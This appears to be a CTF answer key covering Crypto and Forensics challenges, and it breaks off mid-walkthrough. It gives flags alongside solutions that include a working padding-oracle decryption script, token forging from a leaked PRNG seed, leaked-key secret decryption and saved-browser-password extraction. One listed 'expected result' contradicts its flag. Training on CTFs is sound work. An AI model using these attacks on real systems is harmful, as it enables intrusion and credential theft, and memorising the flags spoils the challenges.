### CSCTF Challenge Compendium

_Total visible challenges: 54_

### Category Index

- [Crypto](#crypto) – 9 challenges
- [Forensics](#forensics) – 5 challenges
- [Linux](#linux) – 6 challenges
- [Misc](#misc) – 9 challenges
- [OSINT](#osint) – 6 challenges
- [Programming](#programming) – 6 challenges
- [Pwn](#pwn) – 2 challenges
- [Rev](#rev) – 3 challenges
- [Sanity Check](#sanity-check) – 1 challenge
- [Stegano](#stegano) – 1 challenge
- [Web](#web) – 6 challenges

<br>

<br>

# 🚩 CRYPTO 🚩

## <span style="color:#1E88E5">&#9679;</span> Chef

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{700_m4ny_l4y3rs_in_+his_r3cip3}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
You must be a cyber chef to see the ingredients I put in mixing up these encodings.
Can you figure it out?
`0x510x310x4e0x440x560x450x590x6c0x4e0x300x4a0x740x560x570x4e0x490x580x7a0x4e0x750x590x7a0x420x6b0x4d0x570x350x6e0x580x310x640x410x550x310x390x450x4d0x450x340x7a0x580x320x4e0x6f0x4d0x320x590x6c0x4e0x300x510x3d`

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Hex decode
2. base64 decode
3. URL decode

<br>

The challenge name and description reference the well-known tool CyberChef.

There are 3 simple encodings done to the flag, in this order:
- URL encode
- base64 encode
- Hex encode

<br>

### 1. Hex decode
From initial:
```
51314e445645596c4e3049334d44416c4e555a744e4735354a545647624452354d334a7a4a5456476157346c4e55596c4d6b4a6f61584d6c4e555a794d324e7063444d6c4e30513d
```

To
```
Q1NDVEYlN0I3MDAlNUZtNG55JTVGbDR5M3JzJTVGaW4lNUYlMkJoaXMlNUZyM2NpcDMlN0Q=
```

<br>

### 2. base64 decode
```
CSCTF%7B700%5Fm4ny%5Fl4y3rs%5Fin%5F%2Bhis%5Fr3cip3%7D
```

<br>

### 3. URL decode
`CSCTF{700_m4ny_l4y3rs_in_+his_r3cip3}`



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Enigma

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{much_3nc0d1ng_w@s_d0n3_ch3f}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
The germans are advancing as we speak!
We just received this machine with some instructions, but who on this land can use it, for God's sake?!
On the back of it a page writes with miniscule characters the following:
`Shark-C`
`rotor-I-II-III`
`12-34-56`
`se cu ri ty`
I think we have to use it to decode the mail we just received from LtCol. Sanders. He might be checking if we figured this thing out.
The flag is case insensitive.

**Flag format:** Flag format: **`CSCTF{message}`** (case-insensitive)

---

### Resources

#### Files
- `files/code.txt`

#### Hints
- **Hint 1** (cost 10)
  Use a tool like cryptii to solve this challenge easily
<br>


---

### Solution Walkthrough

1. Enigma machine
2. Settings

<br>

### 1. Enigma
The text is encoded using the Enigma machine!
To decode it, you can use a site like Cryptii which as the Enigma function with its adjustments.

<br>

### 2. Settings

Based on the description, we can deduce the variables we need to set:
```
Machine:        Enigma M4 (Kriegsmarine)
Reflector:      UKW B thin

Rotor 1 - I
	pos 1
	ring 2
Rotor 2 - II
	pos 3
	ring 4
Rotor 3 - III
	pos 5
	ring 6

Plugboard (Steckerbrett): se cu ri ty
```

The initial message:
```
NR 482/25 — ZGP/NRW — 221530B SEP 41 — VON WOLFSTURM AN EDELWEISS. Verfahren P7. Tagesschlüssel bestätigt; Spruchschlüssel "ARX". Prüfgruppe: KFH. Funkstille für zwei Minuten aufgehoben; sofort weiterleiten.

Feinddruck an der Küste nimmt zu. Geleit sichtet unsere Außenposten; Nebel hebt, Mond wie eine schmale Klinge. Treibstoff knapp, Mannschaft gefasst. Befehl: Sperrnetz in Quadrant GRÜN-3 ausbringen, bei Einbruch der Nacht absetzen, Zweitcodebücher bei Gefahr vernichten. Droht Ergreifung: Gerät sprengen; keine Spuren für Morgenstreifen.

Alle Meldungen über Ausweichkreis "NACHTGLAS". Nach Erreichen sicheren Hafens Wetterkurz in Trigrammen. Befehlswiederholung verboten. Ende Spruch.
CSCTF{mUcH_3nc0d1ng_W@S_D0N3_ch3f}
```

The decoded message:
```
nr 482/25 — zgp/nrw — 221530b sep 41 — von wolfsturm an edelweiss. verfahren p7. tagesschlüssel bestätigt; spruchschlüssel "arx". prüfgruppe: kfh. funkstille für zwei minuten aufgehoben; sofort weiterleiten.

feinddruck an der küste nimmt zu. geleit sichtet unsere außenposten; nebel hebt, mond wie eine schmale klinge. treibstoff knapp, mannschaft gefasst. befehl: sperrnetz in quadrant grÜn-3 ausbringen, bei einbruch der nacht absetzen, zweitcodebücher bei gefahr vernichten. droht ergreifung: gerät sprengen; keine spuren für morgenstreifen.

alle meldungen über ausweichkreis "nachtglas". nach erreichen sicheren hafens wetterkurz in trigrammen. befehlswiederholung verboten. ende spruch.
CSCTF{much_3nc0d1ng_w@s_d0n3_ch3f}
```

Flag (case-insensitive): `CSCTF{much_3nc0d1ng_w@s_d0n3_ch3f}`



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Friend Check

> Points: **0** · Solves: **0**

> **Flag:** `CTF{w0w_CTFers_hav3_fr31nds!?!!!}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
We should be friends. I hope you like my challenge.

**Flag format:** Flag format: **`CTF{message}`**

---

### Resources

#### Files
- `files/player_friend_check.zip`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Recover multipliers via LLL and strip them (mod `prime`)
2. Kill `(P+Q)` via isogeny and get `pt mod p2`
3. Reconstruct plaintext with CRT and decode

#### 1. Recover multipliers via LLL and strip them (mod `prime`)

```sage

# From player output.txt

public = 111589618518243065995277577114763849
prime  = 20966040210558651765632106472607825931533981371474235227943345243212507
ct     = 7268862493461781752603700516437349663415400402628512363313184258690143
friend_powers = [151292854050382116035763063, 24634434134153840231225836923, 350928759816759802286087280,
659233294050679826486565474381, 3800009732327813341886384352, 472444725468225084454100997285844,
2567582852803931729692441828502302]

# Build lattice and LLL to recover small multipliers (x_i)

n = len(friend_powers)
mat = []
mat.append([public] + [1] + [0]*n)
for i in range(n):
mat.append([-friend_powers[i]] + [0]*(i+1) + [1] + [0]*(n-i-1))
mat.append([prime] + [0]*(n+1))

L = matrix(ZZ, mat)
W = diagonal_matrix([2^1024, 2^1024] + [1]*n)
B = (L*W).LLL() / W

# Find vector v = [0, ±1, x1, x2, ..., xn]

v = [row for row in B if row[0] == 0 and abs(row[1]) == 1][0]
if v[1] < 0: v = -v

# Remove multipliers from ct to get pt mod prime

m_mod_prime = ct
for xi in v[2:]:
m_mod_prime = (m_mod_prime * inverse_mod(int(xi), prime)) % prime

int(m_mod_prime)
```

#### 2. Kill `(P+Q)` via isogeny and get `pt mod p2`

```sage
p2 = 5983008023
F.<i> = GF(p2^2, modulus=[1,0,1])
E = EllipticCurve(F, [0, 1])
P, Q = E.gens()

# From player output.txt

R = E(4372176737*i + 1948408046, 2141680381*i + 3328801657)
Z = E(5416566873*i + 344136313, 1284413881*i + 1581206776)

phi = E.isogeny(P+Q, algorithm='factored')   # kernel <P+Q> kills fake_friend*(P+Q)
m_mod_p2 = Integer( phi(Z).log( phi(R) ) )   # discrete log gives pt mod p2
int(m_mod_p2)
```

#### 3. Reconstruct plaintext with CRT and decode

```sage
from sage.all import crt

# Combine residues: pt ≡ m_mod_prime (mod prime), pt ≡ m_mod_p2 (mod p2)

pt = crt([int(m_mod_p2), int(m_mod_prime)], [p2, prime])

# Decode to bytes (no external libs)

n = int(pt)
blen = (n.bit_length() + 7) // 8
flag_bytes = n.to_bytes(blen, 'big')
print(flag_bytes)
```



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> iBadge

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{w3LLD0NE_QR_pr3dct2v#_P@sS}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
During our automated scan of the internal network, we flagged this "iBadge" web app running on a dev server.
I talked to the Event-Tech manager. Apparently, it's an old internal tool a junior dev wrote a while back just to learn Flask.
They recently "slapped a new frontend on it" for a small, internal event for a **seed funding**.
It's not critical infrastructure, but it's on our network, so it's in scope.
The manager mentioned the dev was particularly proud of the "live uptime calculator" in the footer, which 'pings the server's boot time'. Their words.
This sounds like a classic beginner setup.
See if you can get admin access, which the app creates for itself at startup.
If you can pop it, we can write it up and get them to decommission it or hand it over to a senior dev to be rebuilt properly.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Extract `BOOT_TS` seed
2. Reproduce admin token locally
3. Redeem token to obtain flag

#### 1. Extract `BOOT_TS` seed

Header path:
```bash
SEED=$(curl -is https://<<HOST>>/ | sed -n 's/^X-Boot: //p'); echo "$SEED"
```

HTML fallback:
```bash
SEED=$(curl -s https://<<HOST>>/ | grep -Eo 'let BOOT *= *[0-9]+' | awk '{print $3}'); echo "$SEED"
```
Result should be a Unix timestamp (integer).

#### 2. Reproduce admin token locally

```bash
TOKEN=$(python -c 'import sys,random; s=int(sys.argv[1]); print(f"{random.Random(s).getrandbits(32):08x}")' "$SEED"); echo "$TOKEN"
```
Token must be 8 hex chars, lowercase.

#### 3. Redeem token to obtain flag

```bash
curl -s "https://<<HOST>>/redeem?uid=1&tid=$TOKEN"
```
If invalid, recheck the seed and hex casing.



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Letter

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{puZZl#_pUt_2g3th3R}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Quick! You know the flag, right?
It is right in front of `y o u`, just look at it.
You can read it, just take it step-by-step.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/f-l-a-g.txt`

#### Hints
- **Hint 1** (cost 10)
  You don't need to crack these hashes yourself.
<br>


---

### Solution Walkthrough

1. Verify with CrackStation (sample)
2. Bulk look up all hashes on CrackStation
3. Concatenate results to form the flag

#### 1. Verify with CrackStation (sample)

Reason: the algorithm and per-character encoding aren’t knowable from context; CrackStation auto-detects and reveals plaintexts.
```bash
# Copy a few lines to test

head -5 hashes.txt
```
Paste those lines into [https://crackstation.net](https://crackstation.net) and confirm each returns a single printable character. <br>

#### 2. Bulk look up all hashes on CrackStation

Paste the entire `hashes.txt` (one hash per line) into CrackStation.
Copy the recovered characters, one per line and in the same order, into a file `chars.txt`. <br>

#### 3. Concatenate results to form the flag

Order matters—do not sort; join exactly as returned.
```bash
tr -d '\n' < chars.txt; echo
```
Flag: `CSCTF{puZZl#_pUt_2g3th3R}`



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Noncesense

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{c7r_n0nc3_r3us3_br34ks_c0nfid3n7i4li7y}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Please tell me you can help me recover something from this nonsense.
I literarly cannot figure out anything!

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/SHA256SUMS`
- `files/noncesense-dist.zip`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Confirm CTR keystream reuse
2. Recover keystream from known file
3. Decrypt `flag.enc` with the keystream

#### Why this works (brief)
AES-CTR turns a block cipher into a stream cipher:
`ciphertext = plaintext ⊕ keystream`, where `keystream = AES(key, nonce||counter)...`
Reusing the **same key+nonce (IV)** reuses the **same keystream**.
Given known `(P1, C1)` and target `C2`, we get:
`keystream = C1 ⊕ P1` and then `P2 = C2 ⊕ keystream`.
No keys, no brute force. Just XOR.
<br>

#### 1. Confirm CTR keystream reuse
Bundle provides:
- known plaintext: `notflag.png`
- its ciphertext: `notflag.png.enc`
- target ciphertext: `flag.enc`
This is exactly the CTR-nonce-reuse scenario.
<br>

#### 2. Recover keystream from known file
```python
# xor_recover.py — derive keystream from known plaintext/ciphertext
p1 = open("notflag.png","rb").read()
c1 = open("notflag.png.enc","rb").read()
n  = min(len(p1), len(c1))
keystream = bytes(a ^ b for a, b in zip(p1[:n], c1[:n]))
open("keystream.bin","wb").write(keystream)
print(f"keystream bytes: {len(keystream)}")
```
Run:
```bash
python3 xor_recover.py
```
Optional sanity check (PNG header should appear when undoing XOR on C1):
```python
print((bytes(a ^ b for a,b in zip(open("notflag.png.enc","rb").read()[:8], open("keystream.bin","rb").read()[:8]))))
# Expected prefix: b'\x89PNG\r\n\x1a\n'
```
<br>

#### 3. Decrypt `flag.enc` with the keystream
```python
# xor_decrypt_flag.py — recover plaintext using the keystream
c2 = open("flag.enc","rb").read()
ks = open("keystream.bin","rb").read()
m  = bytes(a ^ b for a, b in zip(c2, ks[:len(c2)]))
open("flag.txt","wb").write(m)
try:
    print(m.decode())   # expected: CSCTF{...}
except UnicodeDecodeError:
    print(m)
```
Run:
```bash
python3 xor_decrypt_flag.py && echo && echo "Flag saved to flag.txt"
```
<br>

Expected result:
```txt
CSCTF{ctr_nonce_reuse_breaks_confidentiality!}
```



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Norhtline Secrets

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{sops_age_leak_operational_impact}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Northline Systems: Incident IR-4217
A production workstation used for release operations was decommissioned after a disk error. Our GitOps pipeline has failed to publish October configuration since 2025-10-01. Audit requires the "October access token" used by the API team to reconcile approvals.
You are given a sanitized operations bundle captured from the time of failure. Work as you would in a real incident: review the material, validate assumptions, and recover the exact token value used in production during October.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/northline_secrets.zip`
- `files/SHA256SUMS`

#### Hints
No hints provided.

---

### Solution Walkthrough

## Goal
Recover the exact token value embedded in the production secrets. The token equals the flag.

## Evidence chain (what leads to the solve)
1) `bundle/repo/` is a GitOps snapshot with Kubernetes manifests. `environments/prod/secrets.enc.yaml` looks like a SOPS-managed secret.
2) `bundle/repo/.sops.yaml` references age as the master key provider for `secrets.enc.yaml`.
3) `bundle/logs/ci.log` shows decrypt failures consistent with missing age private keys.
4) `bundle/evidence/ops-laptop-2025-09-29.tar.gz` contains a homedir backup. Inside: `home/ops/.config/age/keys.txt`.

## Primary solve
From the extracted `bundle/` directory:

```bash
# 1) Extract the leaked private key
tar -tzf evidence/ops-laptop-2025-09-29.tar.gz | grep -E '\.config/age/keys\.txt$'
tar -xzf evidence/ops-laptop-2025-09-29.tar.gz home/ops/.config/age/keys.txt

# 2) Point SOPS to the key and decrypt the production secret
export SOPS_AGE_KEY_FILE=home/ops/.config/age/keys.txt
sops -d repo/environments/prod/secrets.enc.yaml | sed -n '1,120p'

# 3) Extract the token value (flag)
sops -d repo/environments/prod/secrets.enc.yaml \
  | awk -F': ' '/^\s*AUDIT_UNLOCK_TOKEN:/ {print $2}' \
  | tr -d '\r\n'

The printed string is the flag (e.g., CSCTF{...}).


<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Rstore

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{c0nf1G_w1ns_m3_oV3R}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Helpdesk ticket HD-4581, workstation NL-HQ-WS22 (decommissioned). Ops pulled the user's "secure export" folder straight off the profile along with the original sync configuration and a short run log. The machine is gone; no cloud access, no vault artifacts, no second chances. What you have is exactly what was recovered.
Audit wants the October reports back on their desk. Treat this like a real handoff: work from the recovered directory, read what's there, and reconstruct the material. The answer is in the data you were given.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/bundle.zip`
- `files/SHA256SUMS`

#### Hints
- **Hint 1** (cost 10)
  How could rclone be useful here?
<br>


---

### Solution Walkthrough

1. Unpack `bundle.zip` and enter `bundle/`
2. Use `rclone` with the bundled config
3. Read the flag

#### 1. Unpack `bundle.zip` and enter `bundle/`
```bash
unzip files/bundle.zip -d /tmp && cd /tmp/bundle || { cd bundle; }
```
Optional integrity check:
```bash
sha256sum -c ../SHA256SUMS 2>/dev/null || true
```
<br>

#### 2. Use `rclone` with the bundled config
Run from **inside** `bundle/` so the relative `./enc` path resolves.
```bash
export RCLONE_CONFIG=./rclone.conf
rclone lsf archive_10_2025: > /dev/null   # sanity check
```
<br>

#### 3. Read the flag
```bash
rclone cat archive_10_2025:flag.txt
# → CSCTF{c0nf1G_w1ns_m3_oV3R}
```
<br>

#### Why this works (brief)
`rclone.conf` defines a **crypt** remote `archive_10_2025` pointing to local `./enc` and includes the obscured `password`/`password2`. `rclone` decrypts transparently; no cloud or extra keys needed.



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Secustoring

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{cbc_padding_oracles_still_bite}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
From Infra Lead:
At 04:20 our KMS failed after a routine patch. The storage cluster won't boot, new-admin onboarding is blocked, and audit is waiting. You're on the jump host with what the vendor shipped before the outage.
Your task: recover the admin bootstrap secret from the most recent backup and hand it back so we can restore onboarding and close the incident.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/securevault_field_restore.zip`

#### Hints
- **Hint 1** (cost 20)
  Flip ciphertext bytes only. The verifier checks padding before integrity.
Use the exit code as your signal: 0 or 20 = valid padding, 10 = invalid padding.<br>


---

### Solution Walkthrough

1. Unpack bundle and inspect
2. Treat `svlt-verify` as a padding oracle
3. Decrypt CBC block-by-block
4. Parse JSON and extract `secret`

#### Why this works (brief)
AES-CBC with PKCS#7 has the relation `P = Dec_K(C) ⊕ IV/prev`. The vendor verifier checks **padding before MAC** and exposes the result via exit codes:
- `10` → invalid padding
- `0` or `20` → padding syntactically valid (auth may still fail)
Flipping bytes in the IV/previous block and observing the code leaks one byte at a time.
<br>

#### 1. Unpack bundle and inspect
```bash
unzip -q files/securevault_field_restore.zip -d /tmp/svlt && cd /tmp/svlt
# Optional: verify checksums
sha256sum -c SHA256SUMS 2>/dev/null || true
# Expected contents: svlt-verify/ , backup_target.svlt , README.md , SHA256SUMS
```
<br>

#### 2. Treat `svlt-verify` as a padding oracle
Exit codes: `10=PAD_ERR`, `20=MAC_ERR`, `0=OK`, `2=FORMAT_ERR`.
We return True if padding is valid (0 or 20), False if 10; ignore 2.
```python
import os, tempfile, subprocess

VER_BIN = os.path.join("svlt-verify","svlt-verify")

def oracle(buf: bytes) -> bool:
    """True → padding valid (0 or 20). False → padding invalid (10)."""
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(buf); f.flush(); p = f.name
    try:
        r = subprocess.run([VER_BIN, p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1.5)
        if r.returncode == 10:   # PAD_ERR
            return False
        if r.returncode in (0, 20):  # OK or MAC_ERR => padding valid
            return True
        if r.returncode == 2:    # FORMAT_ERR (e.g., truncated) — treat as invalid probe
            return False
        raise RuntimeError(f"unexpected return code: {r.returncode}")
    finally:
        try: os.unlink(p)
        except: pass
```
<br>

#### 3. Decrypt CBC block-by-block
Read the container (`SVLT\x00\x01` | IV(16) | CT...). Recover each plaintext block with a forged IV′.
```python
BS = 16
MAGIC = b"SVLT\x00\x01"

blob = open("backup_target.svlt","rb").read()
assert blob.startswith(MAGIC) and len(blob) >= len(MAGIC)+16+BS
hdr = blob[:len(MAGIC)+16]
iv  = blob[len(MAGIC):len(MAGIC)+16]
ct  = blob[len(MAGIC)+16:]
blocks = [ct[i:i+BS] for i in range(0, len(ct), BS)]

def decrypt_block(header: bytes, prev: bytes, cur: bytes) -> bytes:
    """
    Classic padding-oracle:
      - enforce pad on solved tail
      - probe byte guesses
      - disambiguate false positives
    """
    base = bytearray(header + prev + cur)
    off  = len(header)
    def set_iv(i,v): base[off+i] = v & 0xFF
    def get_iv(i):   return base[off+i]

    P = bytearray(BS)
    for pad in range(1, BS+1):
        pos = BS - pad
        # enforce pad on tail already solved
        for j in range(BS-1, pos, -1):
            set_iv(j, prev[j] ^ P[j] ^ pad)

        found = False
        for g in range(256):
            set_iv(pos, prev[pos] ^ g ^ pad)
            if not oracle(bytes(base)):
                continue

            if pad == 1:
                helper = BS - 2
                saved = get_iv(helper)
                set_iv(helper, (saved ^ 1) & 0xFF)
                ok2 = oracle(bytes(base))
                set_iv(helper, saved)
                if not ok2:
                    continue
            else:
                j = BS - 1 if (BS - 1) != pos else BS - 2
                saved = get_iv(j)
                set_iv(j, (saved ^ 1) & 0xFF)
                still_ok = oracle(bytes(base))
                set_iv(j, saved)
                if still_ok:
                    continue

            P[pos] = g
            set_iv(pos, prev[pos])  # restore for next iteration
            found = True
            break

        if not found:
            raise RuntimeError(f"no byte found at pad={pad}")
    return bytes(P)

# Recover plaintext
pt = b""
prev = iv
for i, C in enumerate(blocks, 1):
    pt += decrypt_block(hdr, prev, C)
    prev = C

# Strip PKCS#7
pad = pt[-1]
assert 1 <= pad <= BS and pt.endswith(bytes([pad])*pad)
pt = pt[:-pad]

open("plaintext.bin","wb").write(pt)
try:
    s = pt.decode("utf-8")
except UnicodeDecodeError:
    s = pt.decode("utf-8","ignore")
open("plaintext.txt","w").write(s)
print(s[:200] + ("..." if len(s)>200 else ""))
```
<br>

#### 4. Parse JSON and extract `secret`
The payload is JSON like: `{"app":"SecureVault","role":"admin","secret":"CSCTF{...}","exp":"...","ver":1}`.
Extract and print the flag.
```python
import re, json
flag = None
try:
    j = json.loads(s)
    flag = j.get("secret")
except Exception:
    m = re.search(r'"secret"\s*:\s*"([^"]+)"', s) or re.search(r'secret=([A-Za-z0-9_\-\{\}#@!$%^&*]+)', s)
    if m: flag = m.group(1)

if not flag:
    raise SystemExit("secret not found — inspect plaintext.txt")
print(flag)
open("flag.txt","w").write(flag + "\n")
```
<br>

Expected result:
```txt
CSCTF{cbc_padding_oracles_still_bite}
```



<br>
<br>

---

# 🚩 FORENSICS 🚩

## <span style="color:#1E88E5">&#9679;</span> Artifacts

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{v4ult_m4st3r_s3cr3t}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
New profile, new me!
My passwords are secured with military-grade encryption and professional, custom, intricate, specially-designed, complex passwords.
There is absolutely no way you can see my files!

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/firefox_profile.zip`

#### Hints
- **Hint 1** (cost 10)
  Do you think there is place for password reuse?
<br>


---

### Solution Walkthrough

1. Extract the provided Firefox profile and recover the saved vault password.
2. Use that password to decrypt `downloads/report.7z`.
3. Read `flag.txt` for the flag.

#### 1. Recover the saved password
Unzip `firefox_profile.zip` to get `ff/` (profile) which already contains `downloads/`.

GUI (quickest):
```bash
firefox --no-remote --profile ./ff &
# In Firefox: open about:logins → entry for http://vault.acme.local (john.doe) → copy saved password
```

CLI (offline):
```bash
git clone https://github.com/unode/firefox_decrypt && cd firefox_decrypt
python3 firefox_decrypt.py -d ../ff
# Output ends with the vault password: VaultAccess#2025!
```
<br>

#### 2. Decrypt the report archive
```bash
7z x ./ff/downloads/report.7z -p'VaultAccess#2025!'
```
You should now have `flag.txt` alongside the extracted files.
<br>

#### 3. Read the flag
```bash
cat flag.txt
CSCTF{v4ult_m4st3r_s3cr3t}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Logs

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{DNS_TXT_R3cords_r_sn34ky}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
> Our SOC team detected suspicious PowerShell activity on a critical server. We managed to capture Windows Event Logs from the incident, but the attackers used advanced obfuscation techniques to hide their tracks.
>
> Can you unravel the multi-stage payload and follow the digital breadcrumbs to discover what the attackers were trying to do?

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/forensics-logs.zip`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Load the provided EVTX files in an event log viewer.
2. Hunt for suspicious PowerShell execution and decode the staged payloads.
3. The final decoded payload reveals the flag.

#### 1. Load the EVTX set
Use Windows Event Viewer or `evtx_dump.py` to open `Application.evtx`, `Security.evtx`, `System.evtx`, `Setup.evtx`, and `Operational.evtx` (all provided in the ZIP).
<br>

#### 2. Identify suspicious PowerShell events
- Filter `Microsoft-Windows-PowerShell/Operational` for `Event ID 4104` (ScriptBlockLogging) and `Event ID 4103`.
- Locate the script blocks showing base64-encoded `-enc` commands and obfuscated strings (nested `FromBase64String`, `iex`, `Resolve-DnsName`).
- Extract the encoded blob from the script block, strip whitespace, and base64-decode. The decoded script pivots to `Resolve-DnsName -Type TXT` to fetch payload bytes from DNS TXT records.
<br>

#### 3. Recover the flag
Decode the embedded payload completely (UTF-16/base64 layers). The final plaintext reveals:
```
CSCTF{DNS_TXT_R3cords_r_sn34ky}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Time-gone

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{sn3@ky_p@cK3Ts}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Our monitoring flagged unusual time-sync traffic involving the internal NTP server.
The attached capture includes routine network noise and NTP traffic.
Your task is to analyze the traffic and figure out any odd interactions.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/ntp_payload.pcap`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Filter NTP replies from `192.168.1.100` and note the changing field.
2. Recognize the exfil channel is the Reference ID at UDP payload byte 12.
3. Pull byte 12 from every reply and decode to reveal the flag.

#### 1. Filter and inspect the traffic
```bash
tshark -r ntp_payload.pcap -Y 'ntp && ip.src==192.168.1.100'
```
In Wireshark: `ntp && ip.src==192.168.1.100` → expand *Network Time Protocol v4* → right-click **Reference ID** → *Apply as Column* to see only that field changing.
<br>

#### 2. Confirm the covert offset
- NTPv4 places **Reference ID** at payload bytes **12–15**.
- For `tshark -e udp.payload` output, byte 0 is chars 1–2, so byte 12 is chars 25–26 of the hex string.
<br>

#### 3. Extract and decode the message
```bash
tshark -r ntp_payload.pcap \
  -Y 'ntp && udp.srcport==123 && ip.src==192.168.1.100' \
  -T fields -e udp.payload | \
  awk '{ printf "%s", substr($1,25,2); }' | xxd -r -p ; echo
```
Output:
```
CSCTF{sn3@ky_p@cK3Ts}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Update

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{sh0rtcu7s_c4n_b3_d4ng3rous}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
> A user reported receiving a suspicious shortcut file that supposedly contained "important updates." The file looks innocent enough, but our initial analysis suggests there's more than meets the eye.
>
> Can you uncover what this shortcut is really trying to do?

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/update.lnk`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Inspect the LNK metadata.
2. Extract the encoded PowerShell payload.
3. Decode to recover the flag.

#### 1. Inspect the LNK metadata
Use `file update.lnk` (or a LNK parser) to confirm it is a Windows shortcut pointing to `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with command-line arguments.
<br>

#### 2. Extract the encoded PowerShell payload
View the raw contents (e.g., `cat update.lnk` or a LNK inspector) and locate the `-EncodedCommand` parameter. The embedded base64 blob is:
```
QwBTAEMAVABGAHsAcwBoADAAcgB0AGMAdQA3AHMAXwBjADQAbgBfAGIAMwBfAGQANABuAGcAMwByAG8AdQBzAH0A
```
<br>

#### 3. Decode to recover the flag
Base64-decode the blob (it is UTF-16LE encoded) to get the plaintext:
```
CSCTF{sh0rtcu7s_c4n_b3_d4ng3rous}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Volatile Questions

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{w1nd0w5_53cur17y_qu35710n5_4r3_c00k3d}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
uhh… i set those windows security questions and then promptly forgot them.
Can you fish the answers out of this image and save my dignity?
Download the image here: [csctf25-volatile-questions.rar](https://files.chronos-security.ro/csctf25-volatile-questions.rar) (~6GB)

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Extract the Windows registry hives (`SAM`, `SECURITY`, `SYSTEM`) from the disk image.
2. Load those hives with NirSoft SecurityQuestionsView to read the three security-question answers.
3. Decode the three encoded parts and concatenate them to get the flag.

#### 1. Pull the offline hives
- Open the supplied image (`csctf25-volatile-questions.rar` → raw/ewf image) in FTK Imager → *Add Evidence* → point to the extracted image.
- Browse to `Windows/System32/config`, select the `SAM`, `SECURITY`, and `SYSTEM` files, right-click → *Export*.

> CLI alternative (if you prefer not to use FTK): extract the same paths from the image with `7z`/`tsk_recover`/`mmls`+`icat`, then copy out `Windows/System32/config/{SAM,SECURITY,SYSTEM}`.
<br>

#### 2. Read the security questions
- Download NirSoft **SecurityQuestionsView** (works offline).
